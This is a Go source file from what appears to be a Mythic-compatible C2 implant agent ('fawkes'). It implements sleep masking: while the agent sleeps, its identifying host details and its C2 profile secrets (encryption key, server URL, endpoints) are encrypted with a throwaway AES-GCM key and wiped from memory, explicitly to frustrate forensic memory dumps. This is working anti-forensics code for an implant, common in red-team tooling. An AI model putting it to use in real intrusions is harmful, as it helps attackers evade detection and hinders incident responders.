package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/json"
	"log"

	"fawkes/pkg/commands"
	fhttp "fawkes/pkg/http"
	"fawkes/pkg/profiles"
	"fawkes/pkg/structs"
)

// sleepVault holds encrypted copies of sensitive agent and C2 profile data
// during sleep cycles. While the agent sleeps, original struct fields are
// zeroed and data lives only in the encrypted vault — making memory dumps
// during sleep far less useful for forensic analysis.
type sleepVault struct {
	key           []byte // Random AES-256-GCM key for this sleep cycle
	agentBlob     []byte // Encrypted agent sensitive fields
	profileBlob   []byte // Encrypted C2 profile sensitive fields (nil if tasks active)
	profileMasked bool   // Whether C2 profile fields were encrypted
}

// agentSensitiveData holds the Agent struct fields that could identify the
// agent or reveal operational details in a memory dump.
type agentSensitiveData struct {
	PayloadUUID string `json:"u"`
	Domain      string `json:"d"`
	Host        string `json:"h"`
	User        string `json:"w"`
	InternalIP  string `json:"i"`
	ExternalIP  string `json:"e"`
	ProcessName string `json:"p"`
	Description string `json:"s"`
}

// profileSensitiveData holds the HTTP C2 profile fields that reveal the
// C2 infrastructure or allow decryption of captured traffic.
type profileSensitiveData struct {
	EncryptionKey string            `json:"k"`
	BaseURL       string            `json:"b"`
	UserAgent     string            `json:"a"`
	CallbackUUID  string            `json:"c"`
	HostHeader    string            `json:"h"`
	GetEndpoint   string            `json:"g"`
	PostEndpoint  string            `json:"p"`
	CustomHeaders map[string]string `json:"x,omitempty"`
}

// obfuscateSleep encrypts sensitive agent and C2 profile data before the
// agent enters a sleep cycle. The original struct fields are zeroed so a
// process memory dump during sleep only reveals the encrypted vault.
//
// The C2 profile is only encrypted when no tasks are running — active tasks
// may need the profile to post responses to Mythic during the sleep window.
//
// Returns a vault that must be passed to deobfuscateSleep on wakeup.
// Returns nil if encryption fails (caller should proceed without masking).
func obfuscateSleep(agent *structs.Agent, c2 profiles.Profile) *sleepVault {
	vault := &sleepVault{}

	// Generate random AES-256 key for this sleep cycle
	vault.key = make([]byte, 32)
	if _, err := rand.Read(vault.key); err != nil {
		log.Printf("[WARNING] Sleep mask: key generation failed: %v", err)
		return nil
	}

	// Encrypt agent sensitive fields
	ad := agentSensitiveData{
		PayloadUUID: agent.PayloadUUID,
		Domain:      agent.Domain,
		Host:        agent.Host,
		User:        agent.User,
		InternalIP:  agent.InternalIP,
		ExternalIP:  agent.ExternalIP,
		ProcessName: agent.ProcessName,
		Description: agent.Description,
	}
	plaintext, err := json.Marshal(ad)
	if err != nil {
		log.Printf("[WARNING] Sleep mask: agent marshal failed: %v", err)
		zeroBytes(vault.key)
		return nil
	}
	vault.agentBlob = sleepEncrypt(vault.key, plaintext)
	zeroBytes(plaintext)
	if vault.agentBlob == nil {
		zeroBytes(vault.key)
		return nil
	}

	// Zero agent sensitive fields
	agent.PayloadUUID = ""
	agent.Domain = ""
	agent.Host = ""
	agent.User = ""
	agent.InternalIP = ""
	agent.ExternalIP = ""
	agent.ProcessName = ""
	agent.Description = ""

	// Encrypt C2 profile only when no tasks are running.
	// Active tasks call c2.PostResponse() which needs the encryption key,
	// callback UUID, and endpoint URLs.
	running := commands.GetRunningTasks()
	if len(running) == 0 {
		if hp, ok := c2.(*fhttp.HTTPProfile); ok {
			pd := profileSensitiveData{
				EncryptionKey: hp.EncryptionKey,
				BaseURL:       hp.BaseURL,
				UserAgent:     hp.UserAgent,
				CallbackUUID:  hp.CallbackUUID,
				HostHeader:    hp.HostHeader,
				GetEndpoint:   hp.GetEndpoint,
				PostEndpoint:  hp.PostEndpoint,
				CustomHeaders: hp.CustomHeaders,
			}
			pPlain, pErr := json.Marshal(pd)
			if pErr == nil {
				vault.profileBlob = sleepEncrypt(vault.key, pPlain)
				zeroBytes(pPlain)
				if vault.profileBlob != nil {
					hp.EncryptionKey = ""
					hp.BaseURL = ""
					hp.UserAgent = ""
					hp.CallbackUUID = ""
					hp.HostHeader = ""
					hp.GetEndpoint = ""
					hp.PostEndpoint = ""
					hp.CustomHeaders = nil
					vault.profileMasked = true
				}
			}
		}
	}

	return vault
}

// deobfuscateSleep restores sensitive data from the encrypted vault after
// the agent wakes from sleep. The vault's key and blobs are zeroed after
// restoration to minimize the window where both plaintext and ciphertext
// exist in memory simultaneously.
func deobfuscateSleep(vault *sleepVault, agent *structs.Agent, c2 profiles.Profile) {
	if vault == nil || vault.key == nil {
		return
	}

	// Restore agent fields
	if vault.agentBlob != nil {
		plaintext := sleepDecrypt(vault.key, vault.agentBlob)
		if plaintext != nil {
			var ad agentSensitiveData
			if err := json.Unmarshal(plaintext, &ad); err == nil {
				agent.PayloadUUID = ad.PayloadUUID
				agent.Domain = ad.Domain
				agent.Host = ad.Host
				agent.User = ad.User
				agent.InternalIP = ad.InternalIP
				agent.ExternalIP = ad.ExternalIP
				agent.ProcessName = ad.ProcessName
				agent.Description = ad.Description
			}
			zeroBytes(plaintext)
		}
		zeroBytes(vault.agentBlob)
		vault.agentBlob = nil
	}

	// Restore profile fields
	if vault.profileMasked && vault.profileBlob != nil {
		if hp, ok := c2.(*fhttp.HTTPProfile); ok {
			plaintext := sleepDecrypt(vault.key, vault.profileBlob)
			if plaintext != nil {
				var pd profileSensitiveData
				if err := json.Unmarshal(plaintext, &pd); err == nil {
					hp.EncryptionKey = pd.EncryptionKey
					hp.BaseURL = pd.BaseURL
					hp.UserAgent = pd.UserAgent
					hp.CallbackUUID = pd.CallbackUUID
					hp.HostHeader = pd.HostHeader
					hp.GetEndpoint = pd.GetEndpoint
					hp.PostEndpoint = pd.PostEndpoint
					hp.CustomHeaders = pd.CustomHeaders
				}
				zeroBytes(plaintext)
			}
		}
		zeroBytes(vault.profileBlob)
		vault.profileBlob = nil
	}

	// Zero the vault key
	zeroBytes(vault.key)
	vault.key = nil
}

// sleepEncrypt encrypts plaintext with AES-256-GCM. The nonce is prepended
// to the ciphertext. Returns nil on any error.
func sleepEncrypt(key, plaintext []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil
	}
	return gcm.Seal(nonce, nonce, plaintext, nil)
}

// sleepDecrypt decrypts AES-256-GCM ciphertext with prepended nonce.
// Returns nil on any error (wrong key, corrupt data, etc.).
func sleepDecrypt(key, ciphertext []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize+1 {
		return nil
	}
	nonce, ct := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return nil
	}
	return plaintext
}
